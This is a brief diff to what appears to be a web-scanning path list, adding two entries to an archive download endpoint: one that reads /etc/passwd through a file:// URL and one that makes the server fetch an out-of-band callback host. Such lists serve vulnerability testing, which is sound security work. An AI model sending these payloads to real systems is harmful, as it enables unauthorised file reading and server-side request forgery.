@@ -9645,3 +9645,5 @@ a
 /cgi-bin/idz5kJ.txt
 /wp-content/plugins/embed-swagger/readme.txt
 /cgi-bin/SLtsIf.txt
+/archive/download?file=file:///etc/passwd
+/archive/download?file=http://ctu1e2la6l84rsl142k0omxsxidmwdxtn.oast.live/
